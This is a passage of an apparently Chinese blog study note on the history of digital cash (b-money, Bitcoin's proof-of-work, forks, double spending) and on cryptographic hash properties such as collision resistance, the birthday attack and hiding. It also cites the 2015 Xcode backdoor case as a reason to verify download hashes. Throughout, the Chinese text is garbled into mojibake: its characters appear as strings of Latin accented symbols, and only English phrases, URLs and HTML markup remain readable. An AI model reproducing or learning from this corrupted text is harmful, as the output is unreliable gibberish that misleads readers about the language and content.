¹æ®èµ”å¿è®¡åˆ’å¯¹æ¯ä¸€æ–¹çš„è´¦æˆ·è¿›è¡Œè´·è®°æˆ–å€Ÿè®°ã€‚</p>
</li>
<li><p>æ‰§è¡ŒåˆåŒã€‚å¦‚æœåˆåŒå½“äº‹æ–¹å³ä½¿åœ¨ä»²è£å‘˜çš„å¸®åŠ©ä¸‹ä¹Ÿæ— æ³•å°±é€‚å½“çš„ç»“è®ºè¾¾æˆä¸€è‡´ï¼Œåˆ™æ¯ä¸€æ–¹éƒ½ä¼šå¹¿æ’­å»ºè®®çš„èµ”å¿&#x2F;ç½šæ¬¾æ—¶é—´è¡¨ä»¥åŠä»»ä½•æœ‰åˆ©äºä»–çš„è®ºæ®æˆ–è¯æ®ã€‚æ¯ä¸ªå‚ä¸è€…ç¡®å®šå®é™…çš„èµ”å¿å’Œ&#x2F;æˆ–ç½šæ¬¾ï¼Œå¹¶ç›¸åº”åœ°ä¿®æ”¹ä»–çš„è´¦æˆ·ã€‚</p>
</li>
</ol>
<p>DAi Weiè‡ªå·±æå‡ºï¼Œè¿™ä¸ªæ–¹æ¡ˆæ˜¯ä¸å¯è¡Œçš„ï¼Œå› ä¸ºå®ƒä¾èµ–äºåŒæ­¥çš„æ— é˜»å¡çš„ç½‘ç»œâ€”â€”ä¹Ÿå³ï¼Œå½“Aliceå‘ç»™Bobä¸¤ä¸ªå•ä½çš„é’±ä¹‹åï¼Œå¦‚æœå¥¹ç«‹åˆ»åˆå‘å‡ºä¸€æ¡Aliceå‘ç»™Carolä¸¤ä¸ªå•ä½çš„é’±çš„æ¶ˆæ¯ï¼Œé‚£ä¹ˆæ‰€æœ‰äººéƒ½èƒ½æŒ‰ç…§é¡ºåºæ¥æ”¶åˆ°è¿™ä¸¤æ¡æ¶ˆæ¯ã€‚è€Œä¸ä¼šå‡ºç°éƒ¨åˆ†äººå…ˆæ”¶åˆ°Bobçš„æ¶ˆæ¯ï¼Œéƒ¨åˆ†äººå…ˆæ”¶åˆ°Carolçš„æ¶ˆæ¯ï¼Œï¼ˆå‡è®¾Aliceåªæœ‰ä¸¤ä¸ªå•ä½çš„é’±ï¼Œé‚£ä¹ˆç¬¬äºŒæ¡æ¶ˆæ¯ä¸ä¼šå¾—åˆ°æ‰§è¡Œï¼‰ï¼Œä»è€Œé€ æˆåˆ†å¸ƒå¼è´¦æœ¬ä¸ä¸€è‡´çš„é—®é¢˜ã€‚</p>
<p>ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒDai Weiæå‡ºäº†å¦ä¸€ç§æ–¹æ¡ˆï¼Œæå‡ºäº†éƒ¨åˆ†æœºå™¨æ‹…ä»»æœåŠ¡å™¨ï¼Œç”±æœåŠ¡å™¨æ¥ä¿ç®¡å¸ç°¿çš„æ¦‚å¿µã€‚the affected participants of each transaction should verify that the message has been received and successfully processed by a randomly selected subset of the serversï¼Œè€Œå‚ä¸äº¤æ˜“çš„ç”¨æˆ·éœ€è¦å‘éšæœºå¤šä¸ªæœåŠ¡å™¨æŸ¥è¯¢ï¼Œä¿è¯ä¿¡æ¯æˆåŠŸæ‰§è¡Œã€‚</p>
<p>B-moneyç‰¹ç‚¹:</p>
<ul>
<li>éå¸¸åšå®šçš„ç¨³å®šå¸ä»·. åœ¨è¿™ä¸ªç³»ç»Ÿä¸­ï¼Œè´§å¸çš„æ€»é‡æ²¡æœ‰é™åˆ¶ï¼ŒåŒæ—¶å’Œç°å®ä¸­çš„ä¸€ç¯®å­çš„è´§ç‰©çš„ä»·æ ¼ç›¸å…³è”ã€‚</li>
</ul>
<p>B-moneyè¿˜æ²¡è§£å†³çš„é—®é¢˜:</p>
<ul>
<li>åˆ†å¸ƒå¼ä¸€è‡´æ€§é—®é¢˜</li>
<li>å·¥ä½œé‡è¯æ˜</li>
<li>æ— æ³•è¿½è¸ªçš„äº¤æ˜“</li>
</ul>
<h2 id="æ¯”ç‰¹å¸"><a href="#æ¯”ç‰¹å¸" class="headerlink" title="æ¯”ç‰¹å¸"></a>æ¯”ç‰¹å¸</h2><p>ä¸­æœ¬èªï¼ˆåŒ¿åæ€§åšçš„æœ€å¥½çš„å¯†ç æœ‹å…‹çš„æˆå‘˜ï¼‰æå‡ºçš„ç½‘ç»œå…·æœ‰è¿™æ ·çš„ç‰¹ç‚¹:</p>
<blockquote>
<p>â€œè¯¥ç½‘ç»œé€šè¿‡éšæœºæ•£åˆ—ï¼ˆhashingï¼‰å¯¹å…¨éƒ¨äº¤æ˜“åŠ ä¸Šæ—¶é—´æˆ³ï¼ˆtimestampsï¼‰ï¼Œå°†å®ƒä»¬åˆå¹¶å…¥ä¸€ä¸ªä¸æ–­å»¶ä¼¸çš„åŸºäºéšæœºæ•£åˆ—çš„å·¥ä½œé‡è¯æ˜ï¼ˆproof-of-workï¼‰çš„é“¾æ¡ä½œä¸ºäº¤æ˜“è®°å½•ï¼Œé™¤éé‡æ–°å®Œæˆå…¨éƒ¨çš„å·¥ä½œé‡è¯æ˜ï¼Œå½¢æˆçš„äº¤æ˜“è®°å½•å°†ä¸å¯æ›´æ”¹ã€‚æœ€é•¿çš„é“¾æ¡ä¸ä»…å°†ä½œä¸ºè¢«è§‚å¯Ÿåˆ°çš„äº‹ä»¶åºåˆ—ï¼ˆsequenceï¼‰çš„è¯æ˜ï¼Œè€Œä¸”è¢«çœ‹åšæ˜¯æ¥è‡ªCPUè®¡ç®—èƒ½åŠ›æœ€å¤§çš„æ± ï¼ˆpoolï¼‰ã€‚åªè¦å¤§å¤šæ•°çš„CPUè®¡ç®—èƒ½åŠ›éƒ½æ²¡æœ‰æ‰“ç®—åˆä½œèµ·æ¥å¯¹å…¨ç½‘è¿›è¡Œæ”»å‡»ï¼Œé‚£ä¹ˆè¯šå®çš„èŠ‚ç‚¹å°†ä¼šç”Ÿæˆæœ€é•¿çš„ã€è¶…è¿‡æ”»å‡»è€…çš„é“¾æ¡â€ã€‚</p>
</blockquote>
<p>æ¯”ç‰¹å¸å’ŒB-moneyéƒ½ä¿è¯äº†åŒ¿åæ€§å’Œå¯éªŒè¯æ€§;æ¯”ç‰¹å¸å¼•å…¥PoWæ¥è§£å†³åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¸€è‡´æ€§é—®é¢˜</p>
<p>ç½‘ç»œè¿è¡Œæ­¥éª¤:</p>
<ol>
<li><p>æ–°çš„äº¤æ˜“å‘å…¨ç½‘è¿›è¡Œå¹¿æ’­ï¼›</p>
</li>
<li><p>æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½å°†æ”¶åˆ°çš„äº¤æ˜“ä¿¡æ¯çº³å…¥ä¸€ä¸ªåŒºå—ä¸­ï¼›</p>
</li>
<li><p>æ¯ä¸ªèŠ‚ç‚¹éƒ½å°è¯•åœ¨è‡ªå·±çš„åŒºå—ä¸­æ‰¾åˆ°ä¸€ä¸ªå…·æœ‰è¶³å¤Ÿéš¾åº¦çš„å·¥ä½œé‡è¯æ˜ï¼›</p>
</li>
<li><p>å½“ä¸€ä¸ªèŠ‚ç‚¹æ‰¾åˆ°äº†ä¸€ä¸ªå·¥ä½œé‡è¯æ˜ï¼Œå®ƒå°±å‘å…¨ç½‘è¿›è¡Œå¹¿æ’­;</p>
<blockquote>
<p>å‡ºç°åˆ†å‰æ€ä¹ˆå¤„ç†?</p>
<p>å‡è®¾ç”²çŸ¿å·¥æŒ–å‡ºAé“¾347å·å—,ç„¶åç«‹åˆ»å¹¿æ’­,å¹¶ç«‹åˆ»å»æŒ–Aé“¾348å·å—,æ­¤æ—¶ç”²çŸ¿å·¥æ”¶åˆ°Bé“¾çš„347å·å—,ä»–å†³å®šå…ˆä¿ç•™,ä»¥é˜²Bé“¾æ›´é•¿,ç„¶åç»§ç»­Aé“¾348å·å—,ç„¶è€Œæ­¤æ—¶æ”¶åˆ°Bé“¾348å·çš„æ¶ˆæ¯,åˆ™ç”²çŸ¿å·¥ç«‹åˆ»æ”¾å¼ƒAé“¾,å¼€å§‹æŒ–Bé“¾349å·å—.æ­¤æ—¶ç”²çŸ¿å·¥æŒ–å‡ºçš„347å·å—å¥–åŠ±å°±æ²¡æœ‰äº†,å—ä¸­æ‰€æœ‰çš„äº¤æ˜“éƒ½æ”¾å›äº¤æ˜“æ± ä¸­,ç­‰å¾…åç»­åŒºå—æ¥æ‰“åŒ…</p>
</blockquote>
</li>
<li><p>å½“ä¸”ä»…å½“åŒ…å«åœ¨è¯¥åŒºå—ä¸­çš„æ‰€æœ‰äº¤æ˜“éƒ½æ˜¯æœ‰æ•ˆçš„ä¸”ä¹‹å‰æœªå­˜åœ¨è¿‡çš„ï¼Œå…¶ä»–èŠ‚ç‚¹æ‰è®¤åŒè¯¥åŒºå—çš„æœ‰æ•ˆæ€§ï¼›</p>
</li>
<li><p>å…¶ä»–èŠ‚ç‚¹è¡¨ç¤ºä»–ä»¬æ¥å—è¯¥åŒºå—ï¼Œè€Œè¡¨ç¤ºæ¥å—çš„æ–¹æ³•ï¼Œåˆ™æ˜¯åœ¨è·Ÿéšè¯¥åŒºå—çš„æœ«å°¾ï¼Œåˆ¶é€ æ–°çš„åŒºå—ä»¥å»¶é•¿è¯¥é“¾æ¡ï¼Œè€Œå°†è¢«æ¥å—åŒºå—çš„éšæœºæ•£åˆ—å€¼è§†ä¸ºå…ˆäºæ–°åŒºå—çš„éšæœºæ•£åˆ—å€¼ã€‚</p>
</li>
</ol>
<p>åŒé‡æ”¯ä»˜é—®é¢˜:</p>
<blockquote>
<p>å¦‚æœAliceè¯•å›¾ç”¨åŒä¸€ç¬”é’±æ¥æ”¯ä»˜ä¸¤ä¸ªäº¤æ˜“ï¼Œé‚£ä¹ˆä¸¤ä¸ªäº¤æ˜“ä¸å¯èƒ½éƒ½å­˜åœ¨äºåŒºå—é“¾ä¸Šï¼Œå› ä¸ºæ¯ä¸€ä¸ªäº¤æ˜“éƒ½ä¼šè¢«æ£€æŸ¥ï¼›å³ä½¿Aliceå¼ºåˆ¶æ€§åœ°å°†ä¸¤ä¸ªäº¤æ˜“éƒ½æ‰“åŒ…è¿›ä¸€ä¸ªåŒºå—ï¼Œå…¶ä»–ç”¨æˆ·ä¹Ÿä¸ä¼šæ¥å—åŒ…æ‹¬äº†ä¸æ­£ç¡®äº¤æ˜“çš„åŒºå—ã€‚å¦‚æœæœ‰ä¸¤ä¸ªçŸ¿å·¥åˆ†åˆ«å°†ä¸¤ç¬”äº¤æ˜“æ‰“åŒ…è¿›äº†è‡ªå·±çš„åŒºå—ï¼Œå¹¶ä¸”éƒ½æˆåŠŸåœ°å®Œæˆäº†å·¥ä½œé‡è¯æ˜ï¼Œé‚£ä¹ˆå“ªä¸€ä¸ªäº¤æ˜“ä¼šçœŸæ­£åœ°æˆä¸ºè¢«å¤§å®¶å…¬è®¤çš„äº¤æ˜“å°±è¦çœ‹è¿æ°”äº†ã€‚</p>
<p>å¦‚æœBobä¸ç›¸ä¿¡Aliceï¼Œé‚£ä¹ˆä»–å¯ä»¥ç­‰å¾…Aliceçš„æ”¯ä»˜æ¶ˆæ¯è¢«æˆåŠŸåœ°æ‰“åŒ…è¿›äº†åŒºå—ï¼Œè€Œä¸”åœ¨å…¶ååˆé“¾æ¥æ›´å¤šåŒºå—ä¹‹åï¼Œæ‰å®Œæˆä¸Aliceçš„äº¤æ˜“ã€‚è­¬å¦‚Aliceå‘Bobä¹°ä¸€æœ¬ä¹¦ï¼ŒæŒ‰ç…§10åˆ†é’Ÿç”Ÿæˆä¸€ä¸ªåŒºå—çš„é€Ÿåº¦ï¼ŒBobå¯ä»¥ç­‰ä¸€ä¸ªå°æ—¶ï¼Œä¹Ÿå³Aliceçš„æ”¯ä»˜æ¶ˆæ¯ä¹‹åæœ‰äº†å¦å¤–5ä¸ªåŒºå—ä¹‹åï¼Œæ‰å°†ä¹¦äº¤ç»™Aliceã€‚</p>
</blockquote>
<p>å‚è€ƒæ–‡çŒ®ï¼š</p>
<p>ã€1ã€‘<a href="https://link.zhihu.com/?target=http://www.itianwei.com/p2p/blockchain/2018-07-27/49351.html">DigiCashä¸ºä»€ä¹ˆå¤±è´¥ï¼Ÿæˆ‘ä»¬å½“é¢é—®äº†é—®â€œæ•°å­—è´§å¸ä¹‹çˆ¶â€David Chaum</a></p>
<p>ã€2ã€‘<a href="https://link.zhihu.com/?target=http://blog.sina.com.cn/s/blog_71851c8b0101c3kl.html">ç›²ç­¾å_DNT_EASY_æ–°æµªåšå®¢</a></p>
<p>ã€3ã€‘<a href="https://link.zhihu.com/?target=http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF">http://sceweb.sce.uhcl.edu/yang/teaching/csci5234WebSecurityFall2011/Chaum-blind-signatures.PDF</a></p>
<p>ã€4ã€‘<a href="https://link.zhihu.com/?target=http://wwwf.imperial.ac.uk/~rbellovi/writings/chaum.pdf">http://wwwf.imperial.ac.uk/~rbellovi&#x2F;writings&#x2F;chaum.pdf</a></p>
<p>ã€5ã€‘<a href="https://link.zhihu.com/?target=http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf">http://blog.koehntopp.de/uploads/chaum_fiat_naor_ecash.pdf</a></p>
<p>ã€6ã€‘<a href="https://link.zhihu.com/?target=http://www.weidai.com/bmoney.txt">http://www.weidai.com/bmoney.txt</a></p>
<p>ã€7ã€‘<a href="https://link.zhihu.com/?target=https://www.8btc.com/article/223424">åˆ›ä¸–æ–‡æ¡£ï¼šå¦‚æœè¯´æ¯”ç‰¹å¸æœ‰ä¸€ä¸ªåˆç¨¿çš„è¯ï¼Œé‚£å°±æ˜¯Wei Daiçš„B-Money</a></p>
<p>ã€8ã€‘<a href="https://link.zhihu.com/?target=https://bitcoinmagazine.com/articles/genesis-files-if-bitcoin-had-first-draft-wei-dais-b-money-was-it/">The Genesis Files: If Bitcoin Had a First Draft, Wei Daiâ€™s B-Money Was It</a></p>
<p>ã€9ã€‘<a href="https://link.zhihu.com/?target=https://www.newyorker.com/magazine/2011/10/10/the-crypto-currency">The Crypto-Currency</a></p>
<p>ã€10ã€‘<a href="https://link.zhihu.com/?target=https://en.wikipedia.org/wiki/Hashcash">https://en.wikipedia.org/wiki/Hashcash</a></p>
<h1 id="åŒºå—é“¾æŠ€æœ¯3-å¯†ç å­¦ä¹‹å“ˆå¸Œ"><a href="#åŒºå—é“¾æŠ€æœ¯3-å¯†ç å­¦ä¹‹å“ˆå¸Œ" class="headerlink" title="åŒºå—é“¾æŠ€æœ¯3:å¯†ç å­¦ä¹‹å“ˆå¸Œ"></a>åŒºå—é“¾æŠ€æœ¯3:å¯†ç å­¦ä¹‹å“ˆå¸Œ</h1><p>ã€Šæ¯”ç‰¹å¸ç™½çš®ä¹¦ã€‹:</p>
<blockquote>
<p>â€œæ‰€ä»¥ï¼Œæˆ‘ä»¬éå¸¸éœ€è¦è¿™æ ·ä¸€ç§ç”µå­æ”¯ä»˜ç³»ç»Ÿï¼Œå®ƒåŸºäºå¯†ç å­¦åŸç†è€Œä¸åŸºäºä¿¡ç”¨ï¼Œä½¿å¾—ä»»ä½•è¾¾æˆä¸€è‡´çš„åŒæ–¹ï¼Œèƒ½å¤Ÿç›´æ¥è¿›è¡Œæ”¯ä»˜ï¼Œä»è€Œä¸éœ€è¦ç¬¬ä¸‰æ–¹ä¸­ä»‹çš„å‚ä¸ã€‚â€</p>
</blockquote>
<h2 id="å“ˆå¸Œ"><a href="#å“ˆå¸Œ" class="headerlink" title="å“ˆå¸Œ"></a>å“ˆå¸Œ</h2><p>åŠ å¯†å“ˆå¸Œï¼ˆcryptographic hashï¼‰:</p>
<blockquote>
<p>åŠ å¯†å“ˆå¸Œæ˜¯å“ˆå¸Œå‡½æ•°çš„ä¸€ç§ï¼Œå®ƒå…·æœ‰æŸäº›å±æ€§ï¼Œä½¿å…¶é€‚ç”¨äºåŠ å¯†ã€‚é€šè¿‡åŠ å¯†å“ˆå¸Œï¼Œå®ƒå°†ä»»æ„å¤§å°çš„æ•°æ®æ˜ å°„åˆ°å›ºå®šå¤§å°çš„ä½ä¸²ï¼ˆæ•£åˆ—ï¼‰ï¼Œå¹¶è¢«è®¾è®¡ä¸ºå•å‘å‡½æ•°ï¼Œå³ä¸€ä¸ªä¸å¯é€†çš„å‡½æ•°ã€‚ä»ç†æƒ³çš„åŠ å¯†æ•£åˆ—å‡½æ•°è¾“å‡ºé‡æ–°åˆ›å»ºè¾“å…¥æ•°æ®çš„å”¯ä¸€æ–¹æ³•æ˜¯å°è¯•å¯¹å¯èƒ½çš„è¾“å…¥è¿›è¡Œæš´åŠ›æœç´¢ï¼Œä»¥æŸ¥çœ‹å®ƒä»¬æ˜¯å¦äº§ç”ŸåŒ¹é…ï¼Œæˆ–ä½¿ç”¨åŒ¹é…å“ˆå¸Œçš„å½©è™¹è¡¨(é‡Œé¢è®°å½•äº†å¸¸è§çš„hashå€¼å¯¹åº”çš„å†…å®¹)ã€‚å¸ƒé²æ–¯æ–½å¥ˆå°”ç§°å•å‘æ•£åˆ—å‡½æ•°æ˜¯â€œç°ä»£å¯†ç å­¦çš„ä¸»åŠ›â€ã€‚è¾“å…¥æ•°æ®é€šå¸¸ç§°ä¸ºæ¶ˆæ¯ï¼ˆMessageï¼‰ï¼Œè¾“å‡ºï¼ˆæ•£åˆ—å€¼æˆ–æ•£åˆ—ï¼‰é€šå¸¸ç§°ä¸ºæ¶ˆæ¯æ‘˜è¦æˆ–ç®€ç§°ä¸ºæ‘˜è¦ï¼ˆDigestï¼‰ã€‚</p>
</blockquote>
<p>ç†æƒ³çš„åŠ å¯†å“ˆå¸Œå‡½æ•°æœ‰äº”ä¸ªä¸»è¦å±æ€§ï¼š</p>
<ol>
<li>ç¡®å®šæ€§çš„ã€‚</li>
</ol>
<p>å¸¸è§çš„å“ˆå¸Œå‡½æ•°éƒ½æ»¡è¶³è¿™ä¸ªç‰¹æ€§ã€‚ï¼ˆåªè¦è®¡ç®—è¿‡ç¨‹ä¸­æ²¡æœ‰å¼•å…¥éšæœºæ•°&#x2F;è°ƒåº¦ï¼Œåº”è¯¥éƒ½æ»¡è¶³ï¼Ÿï¼‰</p>
<ol start="2">
<li>å¿«é€Ÿè®¡ç®—</li>
</ol>
<p>SHA-256ç®—æ³•çš„ä¸»è¦æ“ä½œæ—¶å¼‚æˆ–è¿ç®—ï¼Œä½è¿ç®—éå¸¸å¿«ã€‚</p>
<ol start="3">
<li>Hiding</li>
</ol>
<p>hidingå°±æ˜¯çŸ¥é“å“ˆå¸Œçš„ç»“æœä¸èƒ½å€’æ¨è¾“å…¥ã€‚ç®€å•æ¥è¯´ï¼Œè­¬å¦‚ x mod 100è¿™æ ·çš„å“ˆå¸Œå‡½æ•°ï¼Œå¦‚æœç»“æœæ˜¯1ï¼Œé‚£ä¹ˆxå¯èƒ½æ˜¯1ã€101ã€201ç­‰æ— ç©·çš„æ•°ã€‚ä»SHAæ—ç®—æ³•ï¼Œä»ç»“æœå®Œå…¨å¾—ä¸åˆ°è¾“å…¥çš„ä»»ä½•ä¿¡æ¯ã€‚</p>
<ol start="4">
<li><p>é›ªå´©æ•ˆåº”</p>
</li>
<li><p>æŠ—å†²çªï¼ˆcollision-resistanceï¼‰</p>
<p>å½“ä¸¤ä¸ªè¾“å…¥äº§ç”ŸåŒä¸€ä¸ªè¾“å‡ºï¼Œå°±å‘ç”Ÿäº†å†²çªã€‚è¿™é‡Œçš„æŠ—å†²çªä¸æ˜¯è¯´è‚¯å®šä¸ä¼šå†²çªï¼Œç”±é¸½ç¬¼åŸç†å¾ˆå®¹æ˜“çœ‹å‡ºï¼Œåªè¦å®šä¹‰åŸŸå¤§äºå€¼åŸŸï¼Œè‚¯å®šä¼šæœ‰å†²çªçš„ã€‚å“ˆå¸Œå‡½æ•°çš„æŠ—å†²çªæŒ‡çš„æ˜¯ï¼Œè™½ç„¶å†²çªå°±åœ¨é‚£é‡Œï¼Œé‚£å°±æ˜¯æ‰¾ä¸åˆ°â€”â€”æˆ–è€…è¯´åœ¨å¯æ¥å—çš„æ—¶é—´å†…æ‰¾ä¸åˆ°ã€‚</p>
</li>
</ol>
<p>å“ˆå¸Œå‡½æ•°åœ¨å¯†ç å­¦ä¸­æœ‰ç€â€œç‘å£«å†›åˆ€â€çš„ä½œç”¨ï¼Œæœ‰å„ç§åº”ç”¨ã€‚</p>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬é‡ç‚¹è®¨è®ºä¸‰ä¸ªç‰¹ç‚¹ï¼šæŠ—å†²çªã€éšè—ä»¥åŠpuzzle friendlinessï¼Œä»¥åŠå®ƒä»¬çš„åº”ç”¨ã€‚</p>
<h3 id="æŠ—å†²çª"><a href="#æŠ—å†²çª" class="headerlink" title="æŠ—å†²çª"></a>æŠ—å†²çª</h3><ol>
<li><p><strong>æŠ—å†²çªæ˜¯æŒ‡ä¸å¯èƒ½æ‰¾åˆ°ä¸¤ä¸ªxå’Œyï¼Œå…¶ä¸­x ä¸ç­‰äº yï¼Œè€Œ</strong> $H(x)&#x3D;H(y)$ ã€‚</p>
<p>æ³¨æ„è¿™é‡Œè¯´çš„æ˜¯ä¸å¯èƒ½æ‰¾åˆ°ï¼Œè€Œä¸æ˜¯è¯´ä¸å­˜åœ¨ã€‚å®é™…ä¸Šæ ¹æ®é¸½ç¬¼åŸç†ï¼Œå¯¹äºè¾“å‡ºæ˜¯256æ¯”ç‰¹çš„SHA-256ï¼Œé‚£ä¹ˆåªè¦æ‰¾åˆ°2^256+1çš„è¾“å…¥ï¼Œè‚¯å®šå¯ä»¥æ‰¾åˆ°è‡³å°‘ä¸¤ä¸ªå€¼æœ‰å†²çªã€‚</p>
<p>ä¸Šé¢çš„æ–¹æ³•æ˜¯è‚¯å®šå¯ä»¥æ‰¾åˆ°å†²çªï¼ŒæŠŠå¤æ‚åº¦é™ä½ä¸€ç‚¹ï¼Œåˆ©ç”¨ç”Ÿæ—¥æ”»å‡»åŸç†ï¼Œå¦‚æœéšæœºæŒ‘é€‰2^130+1çš„è¾“å…¥ï¼Œæœ‰99.8%çš„æ¦‚ç‡å¯ä»¥æ‰¾åˆ°å†²çªã€‚</p>
<blockquote>
<p>ç”Ÿæ—¥æ‚–è®ºï¼šç”Ÿæ—¥æ‚–è®ºæ˜¯æŒ‡åœ¨ä¸å°‘äº 23 ä¸ªäººä¸­è‡³å°‘æœ‰ä¸¤äººç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡å¤§äº 50%ã€‚ä¾‹å¦‚åœ¨ä¸€ä¸ª 30 äººçš„å°å­¦ç­çº§ä¸­ï¼Œå­˜åœ¨ä¸¤äººç”Ÿæ—¥ç›¸åŒçš„æ¦‚ç‡ä¸º 70%ã€‚å¯¹äº 60 äººçš„å¤§ç­ï¼Œè¿™ç§æ¦‚ç‡è¦å¤§äº 99%ã€‚è¿™ä¸ªæ•°å­¦äº‹å®ååˆ†åç›´è§‰ï¼Œæ•…ç§°ä¹‹ä¸ºä¸€ä¸ªæ‚–è®ºã€‚ç”Ÿæ—¥æ‚–è®ºçš„æ•°å­¦ç†è®ºè¢«åº”ç”¨äºè®¾è®¡å¯†ç å­¦æ”»å‡»æ–¹æ³•â€”â€”ç”Ÿæ—¥æ”»å‡»ã€‚<br>ä¸ºä»€ä¹ˆæ˜¯23å‘¢ï¼Ÿé€šè¿‡æ¦‚ç‡æ¥è®¡ç®—ä¸€ä¸‹ã€‚<br>å‡è®¾æˆ¿é—´ä¸­æœ‰nä¸ªäººï¼Œé‚£ä¹ˆnä¸ªäººç”Ÿæ—¥å…¨éƒ¨ä¸ç›¸åŒçš„æ¦‚ç‡æ˜¯:</p>
<p>$1*\frac{364}{365}*\frac{363}{365}*\frac{362}{365}â€¦*\frac{365-n+1}{365}$è‡³å°‘æœ‰ä¸¤ä¸ªäººç›¸åŒçš„æ¦‚ç‡å°±æ˜¯1-ä¸Šè¿°æ¦‚ç‡ï¼Œè®¡ç®—å¾—å‡ºçš„nå’Œæ¦‚ç‡çš„å…³ç³»æ˜¯ï¼š</p>
</blockquote>
</li>
</ol>
<blockquote>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233988.png" alt="img"></p>
</blockquote>
<p>   æŠ—å†²çªçš„åº”ç”¨:</p>
<blockquote>
<p>æŠ—å†²çªçš„ä¸€ä¸ªä¸»è¦åº”ç”¨æ˜¯ä¿¡æ¯æ‘˜è¦ï¼ˆmessage digestï¼‰ã€‚</p>
<p>å¯¹äºæŠ—å†²çªæ€§çš„å“ˆå¸Œå‡½æ•°è€Œè¨€ï¼Œå¦‚æœä¸¤ä¸ªè¾“å…¥xå’Œyä¸åŒï¼Œé‚£ä¹ˆå°±å¯ä»¥è®¤ä¸ºH(x)å’ŒH(y)ä¸åŒâ€”â€”å¦åˆ™çš„è¯ï¼Œå°±è¿åäº†æŠ—å†²çªæ€§ã€‚</p>
<p>è¿™ä¸ªæ€§è´¨å°±å¯ä»¥åšä¿¡æ¯æ‘˜è¦ã€‚è€ƒè™‘2015å¹´çš„xcodeåé—¨äº‹ä»¶ï¼Œå› ä¸ºå›½å†…çš„å¼€å‘è€…ä»è‹¹æœå®˜ç½‘ä¸‹è½½xcodeå¼€å‘æ¡†æ¶é€Ÿåº¦å¤ªæ…¢ï¼Œæ‰€ä»¥ä¸€äº›å…¬å¸çš„å¼€å‘äººå‘˜ç›´æ¥ä»ç™¾åº¦äº‘ä¸Šä¸‹è½½äº†æŸäº›äººâ€œå¥½å¿ƒâ€æä¾›çš„ç‰ˆæœ¬ã€‚è…¾è®¯çš„å®‰å…¨å®éªŒå‘ç°å¾ˆå¤šappå‡ºç°å¼‚å¸¸æµé‡åå‘ç°æºå¤´åœ¨äºä½¿ç”¨çš„xcodeï¼Œå³ä½¿å¼€å‘äººå‘˜æœ¬èº«å†™çš„ä»£ç æ˜¯æ­£ç¡®çš„ï¼Œç»è¿‡ç¯¡æ”¹çš„xcodeå¯ä»¥å°†æ¶æ„ä»£ç é“¾å…¥åˆ°appä¸­ã€‚æ‰€ä»¥å¸¦æ¥çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå½“æˆ‘ä»¬ä¸‹è½½å¼€æºçš„è½¯ä»¶ä½¿ç”¨æ—¶ï¼Œæ€ä¹ˆå¯ä»¥ä¿è¯ä¸‹è½½åˆ°çš„è½¯ä»¶æ˜¯å®˜æ–¹çš„è€Œä¸æ˜¯ç»è¿‡ç¬¬ä¸‰æ–¹æ¶æ„ä¿®æ”¹è¿‡çš„å‘¢ï¼Ÿ</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112211233990.jpg" alt="v2-307e48ac17cd19c71201191f50eb24af_1440w"></p>
<p>è¿™æ˜¯mysqlçš„ä¸‹è½½é¡µé¢ï¼Œå¯ä»¥çœ‹åˆ°åœ¨æä¾›ä¸‹è½½é“¾æ¥çš„åŒæ—¶ï¼Œæä¾›äº†MD5æ•£åˆ—æ‘˜è¦ã€‚å¦‚æœæƒ³è¦ä¿è¯å®‰å…¨ï¼Œå¯ä»¥åœ¨ç¬¬ä¸‰æ–¹ä¸‹è½½è½¯ä»¶ä¹‹åï¼Œä½¿ç”¨åŒæ ·çš„ç®—æ³•åšä¸€æ¬¡æ•£åˆ—ï¼Œå¦‚æœç›¸åŒï¼Œå¯ä»¥æ”¾å¿ƒä½¿ç”¨ã€‚</p>
</blockquote>
<h3 id="Hiding"><a href="#Hiding" class="headerlink" title="Hiding"></a>Hiding</h3><p><strong>Hidingçš„æ„æ€æ˜¯å¦‚æœæœ‰å“ˆå¸Œå‡½æ•°çš„è¾“å‡ºyï¼Œé‚£ä¹ˆä¸å¯èƒ½æ‰¾åˆ°xï¼Œä½¿å¾—h(x)&#x3D;yã€‚</strong></p>
<p>å…³äºhidingçš„å«ä¹‰å‰é¢å·²ç»è§£é‡Šè¿‡ã€‚ç°åœ¨çš„ä¸€ä¸ªé—®é¢˜æ˜¯ï¼Œå¦‚æœè¾“å…¥å€¼æœ¬èº«æ˜¯æœ‰é™çš„ï¼Œè­¬å¦‚åœ¨ä¸€ä¸ªæ·ç¡¬å¸çš„æ¸¸æˆä¸­ï¼Œå¦‚æœæ‰”å‡ºæ¥headï¼Œé‚£ä¹ˆå°±è®¡ç®—â€œheadâ€çš„å“ˆå¸Œå€¼ï¼›å¦‚æœæ‰”å‡ºæ¥tailï¼Œé‚£ä¹ˆå°±è®¡ç®—â€tailâ€çš„å“ˆå¸Œå€¼ã€‚é‚£ä¹ˆåœ¨ä¸€æ¬¡æŠ•æ·è¿‡åï¼Œå…¬å¸ƒå“ˆå¸Œå€¼ï¼Œèƒ½çŸ¥é“è¿™æ¬¡æŠ•æ·çš„ç»“æœå—ï¼Ÿ</p>
<p>è¿™ä¸ªé—®é¢˜çš„ç‰¹ç‚¹æ˜¯è¾“å…¥å€¼çš„ç©ºé—´å¤ªå°ï¼Œå¦‚æœæƒ³è¦çŸ¥é“è¾“å…¥æ˜¯ä»€ä¹ˆï¼Œåªéœ€è¦éå†ä¸€éï¼ŒæŠŠæ‰€æœ‰å¯èƒ½çš„å€¼è®¡ç®—ä¸€ä¸‹ï¼Œç„¶åè¿›è¡Œæ¯”å¯¹å°±è¡Œã€‚è­¬å¦‚åœ¨è¿™é‡Œï¼Œåªéœ€è¦ç®—ä¸¤ä¸ªå€¼ï¼Œé‚£ä¹ˆè‚¯å®šå¯ä»¥çŸ¥é“æŠ•æ·çš„ç»“æœã€‚æ‰€ä»¥ä¹Ÿå°±å¤±å»äº†hidingçš„ç‰¹ç‚¹ã€‚</p>
